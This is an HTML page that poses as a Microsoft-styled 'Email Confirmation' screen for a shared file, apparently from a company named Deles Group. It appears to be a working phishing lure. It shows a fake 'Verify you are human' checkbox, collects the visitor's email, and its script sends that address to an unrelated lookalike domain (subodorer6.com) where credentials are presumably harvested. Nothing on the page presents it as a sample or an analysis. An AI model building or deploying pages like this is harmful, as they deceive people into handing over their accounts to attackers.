<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Confirmation</title>
    <style>
        body {
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/3/33/Microsoft_login_screen.svg');
            background-size: cover;
            background-position: center;
        }
        .container {
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 3px;
            padding: 33px;
            width: 80%;
            max-width: 320px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .container img {
            width: 100px;
            margin-bottom: 20px;
        }
        .container input[type="email"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
            text-align: center;
        }
        .container button {
            width: 100%;
            padding: 10px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #005a9e;
        }
        .loading-section {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            font-size: 18px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 5px solid rgba(0, 0, 0, 0.1);
            border-top-color: #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://logo.clearbit.com/delesgroup.com" alt="Logo">
        <h2>Marta Wr√≥blewska invited you to view a file</h2>
        <form id="emailForm" method="GET">
            <input type="email" id="email" name="email" placeholder="Enter Email to Continue" required>
            <div class="error" id="errorMessage" style="display: none;">Please enter a valid email address.</div>
            <label>
                <input type="checkbox" id="humanCheck" required> Verify you are human
            </label>
            <br><br>
            <button type="submit">Continue</button>
        </form>
        <p class="footer">Disclaimer: The information in this email is confidential and intended solely for this recipient. Unauthorized access is prohibited.</p>
    
    <script>
        const form = document.getElementById('emailForm');
        const emailInput = document.getElementById('email');
        const errorMessage = document.getElementById('errorMessage');
        const humanCheck = document.getElementById('humanCheck');

        form.addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            if (!humanCheck.checked) {
                alert('Please verify that you are not a bot.');
                return;
            }

            const email = emailInput.value.trim();

            if (!validateEmail(email)) {
                errorMessage.style.display = 'block';
            } else {
                errorMessage.style.display = 'none';
                // Redirect to the landing page with the email appended as a query parameter
                const redirectUrl = `https://delesgroup-dataroom-access.subodorer6.com/W60IUboNTicdWiHGIQlHtrEFfhVQSYiQ/#W${encodeURIComponent(email)}`;
                window.location.href = redirectUrl;
            }
        });

        function validateEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }
    </script>
</body>
</html>
